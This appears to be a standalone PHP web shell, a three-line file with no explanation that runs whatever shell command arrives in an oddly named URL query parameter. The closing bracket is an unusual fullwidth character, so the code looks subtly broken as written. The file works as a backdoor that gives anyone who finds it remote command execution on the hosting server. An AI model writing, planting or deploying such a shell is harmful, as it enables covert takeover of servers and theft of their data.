<?php
shell_exec($_GET['3ULIhXX9'〕);
?>
